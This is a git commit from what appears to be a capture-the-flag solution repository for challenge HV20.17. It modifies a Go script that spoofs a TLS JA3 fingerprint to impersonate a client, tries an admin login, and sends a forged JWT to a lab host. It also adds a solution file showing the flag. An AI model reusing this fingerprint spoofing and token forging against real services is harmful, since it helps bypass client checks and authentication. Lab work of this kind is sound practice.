9821693d56bcb90a2adeda771bcec99b6a5bc13e
Manuel Zametter <m.zametter@gmail.com>
2020-12-17 15:50:45 +0100

    Cleanup

--- 17/crack.go
+++ 17/crack.go
@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"io/ioutil"
 	"net/http"
 	"net/url"
@@ -10,12 +11,14 @@ import (
 )
 
 func main() {
+	baseURL := "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/"
+
 	// Create an http.Transport object which can be used as a parameter for http.Client
 	tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")
 	// Set the .Transport member of any http.Client 
 	client := &http.Client{Transport: tr}
 	// Make request to website using the new client
-	resp, _ := client.Get("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/")
+	resp, _ := client.Get(baseURL)
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
@@ -26,7 +29,7 @@ func main() {
 		fmt.Println(resp.Header)
 	}
 	
-	resp, _ = client.PostForm("https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/login", 
+	resp, _ = client.PostForm(baseURL + "login", 
 		url.Values{"username": {"admin"}, "password": {"whatever"}})
 	fmt.Println(resp.StatusCode)
 	if resp.StatusCode == http.StatusOK {
@@ -38,10 +41,10 @@ func main() {
 		fmt.Println(bodyString)
 		fmt.Println(resp.Header)
 	}
+	
+	jwt := os.Args[1]
 
-	jwt := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9rZXlzLzFkMjFhOWY5NDUifQ.eyJleHAiOjE2MDgyMTgwOTcsImlhdCI6MTYwODIxNDQ5Nywic3ViIjoic2FudGExMzM3In0.I8uwoESnWF5uztH6mxQqEBBvPvkzQiOrZv1THZ6XdL0"
-
-	req, err := http.NewRequest("GET", "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/", nil)
+	req, err := http.NewRequest("GET", baseURL, nil)
 	if err != nil {
 		return
 	}
@@ -58,6 +61,4 @@ func main() {
 		bodyString := string(bodyBytes)
 		fmt.Println(bodyString)
 	}
-
-	
 }
---
+++ 17/solution.md
@@ -0,0 +1,6 @@
+# HV20.17 Santa's Gift Factory Control
+
+```bash
+➜  17 git:(main) ✗ go run crack.go $(./forge-jwt.py) | grep HV20
+<!--Congratulations, here's your flag: HV20{ja3_h45h_1mp3r50n4710n_15_fun}-->
+```
